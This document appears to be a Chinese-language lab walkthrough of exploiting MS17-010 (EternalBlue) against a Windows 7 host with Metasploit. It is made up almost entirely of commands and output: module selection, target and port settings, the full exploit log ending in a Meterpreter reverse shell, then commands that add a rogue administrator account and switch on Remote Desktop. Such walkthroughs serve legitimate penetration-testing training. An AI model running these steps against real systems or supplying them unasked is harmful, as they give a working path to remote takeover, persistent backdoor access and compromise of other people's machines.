### 1、漏洞覆盖系统范围
```yaml
SMB服务，此MS17-010漏洞主要是针对于Windows7及以前的操作系统。
```
### 2、进入msf终端
```shell script
┌──(rootli)-[~]
└─# msfconsole
```
### 3、搜索漏洞框架
```shell script
msf6 > search 17-010

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution


Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```
### 4、设置相关参数
![image](https://github.com/498946975/Security/blob/master/images/ms17-010.png)
```shell script
msf6 > use exploit/windows/smb/ms17_010_eternalblue
[*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
msf6 exploit(windows/smb/ms17_010_eternalblue) > set LPORT 4445   # 设置本地攻击端口为4445，不能和之前攻击用的端口冲突
LPORT => 4445
msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 172.16.120.145  # 设置需要攻击的目标地址是win7的地址
RHOSTS => 172.16.120.145
```
![image](https://github.com/498946975/Security/blob/master/images/ms17-010_1.png)
### 5、攻击
```shell script
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 172.16.120.177:4445 
[*] 172.16.120.145:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 172.16.120.145:445    - Host is likely VULNERABLE to MS17-010! - Windows 7 Professional 7601 Service Pack 1 x64 (64-bit)
[*] 172.16.120.145:445    - Scanned 1 of 1 hosts (100% complete)
[+] 172.16.120.145:445 - The target is vulnerable.
[*] 172.16.120.145:445 - Connecting to target for exploitation.
[+] 172.16.120.145:445 - Connection established for exploitation.
[+] 172.16.120.145:445 - Target OS selected valid for OS indicated by SMB reply
[*] 172.16.120.145:445 - CORE raw buffer dump (42 bytes)
[*] 172.16.120.145:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 172.16.120.145:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 172.16.120.145:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 172.16.120.145:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 172.16.120.145:445 - Trying exploit with 12 Groom Allocations.
[*] 172.16.120.145:445 - Sending all but last fragment of exploit packet
[*] 172.16.120.145:445 - Starting non-paged pool grooming
[+] 172.16.120.145:445 - Sending SMBv2 buffers
[+] 172.16.120.145:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 172.16.120.145:445 - Sending final SMBv2 buffers.
[*] 172.16.120.145:445 - Sending last fragment of exploit packet!
[*] 172.16.120.145:445 - Receiving response from exploit packet
[+] 172.16.120.145:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 172.16.120.145:445 - Sending egg to corrupted connection.
[*] 172.16.120.145:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 172.16.120.145
[-] 172.16.120.145:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 172.16.120.145:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=FAIL-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[-] 172.16.120.145:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] 172.16.120.145:445 - Connecting to target for exploitation.
[+] 172.16.120.145:445 - Connection established for exploitation.
[+] 172.16.120.145:445 - Target OS selected valid for OS indicated by SMB reply
[*] 172.16.120.145:445 - CORE raw buffer dump (42 bytes)
[*] 172.16.120.145:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 50 72 6f 66 65 73  Windows 7 Profes
[*] 172.16.120.145:445 - 0x00000010  73 69 6f 6e 61 6c 20 37 36 30 31 20 53 65 72 76  sional 7601 Serv
[*] 172.16.120.145:445 - 0x00000020  69 63 65 20 50 61 63 6b 20 31                    ice Pack 1      
[+] 172.16.120.145:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 172.16.120.145:445 - Trying exploit with 17 Groom Allocations.
[*] 172.16.120.145:445 - Sending all but last fragment of exploit packet
[*] 172.16.120.145:445 - Starting non-paged pool grooming
[+] 172.16.120.145:445 - Sending SMBv2 buffers
[+] 172.16.120.145:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 172.16.120.145:445 - Sending final SMBv2 buffers.
[*] 172.16.120.145:445 - Sending last fragment of exploit packet!
[*] 172.16.120.145:445 - Receiving response from exploit packet
[+] 172.16.120.145:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 172.16.120.145:445 - Sending egg to corrupted connection.
[*] 172.16.120.145:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 172.16.120.145
[*] Meterpreter session 19 opened (172.16.120.177:4445 -> 172.16.120.145:49163 ) at 2022-01-18 21:16:19 +0800
[+] 172.16.120.145:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.16.120.145:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 172.16.120.145:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
```
```shell script
meterpreter > pwd
C:\Windows\system32
```
### 6、进入Windows的cmd，增加管理员用户
```shell script
meterpreter > shell
Process 2308 created.
Channel 1 created.
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>net user liuxiang 123 /add
net user liuxiang 123 /add
The command completed successfully.


C:\Windows\system32>net localgroup administrators liuxiang /add
net localgroup administrators liuxiang /add
The command completed successfully.


C:\Windows\system32>
```
### 7、cmd方式开启关闭，远程桌面
```shell script
# 设置远程桌面端口
C:\Windows\system32>reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f
reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /t REG_DWORD /v portnumber /d 3389 /f
The operation completed successfully.
# 开启远程桌面
C:\Windows\system32>wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 1
Executing (\\WIN-QHUNCVCHKIE\ROOT\CIMV2\TerminalServices:Win32_TerminalServiceSetting.ServerName="WIN-QHUNCVCHKIE")->SetAllowTSConnections()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
};

# 检查端口状态
C:\Windows\system32>netstat -an|find "3389"
netstat -an|find "3389"
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING
  TCP    [::]:3389              [::]:0                 LISTENING

# 关闭远程桌面
C:\Windows\system32>wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0
wmic RDTOGGLE WHERE ServerName='%COMPUTERNAME%' call SetAllowTSConnections 0
Executing (\\WIN-QHUNCVCHKIE\ROOT\CIMV2\TerminalServices:Win32_TerminalServiceSetting.ServerName="WIN-QHUNCVCHKIE")->SetAllowTSConnections()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ReturnValue = 0;
};
```
### 8、登陆远程桌面
![image](https://github.com/498946975/Security/blob/master/images/ms17-010_2.png)
![image](https://github.com/498946975/Security/blob/master/images/ms17-010_3.png)
![image](https://github.com/498946975/Security/blob/master/images/ms17-010_4.png)
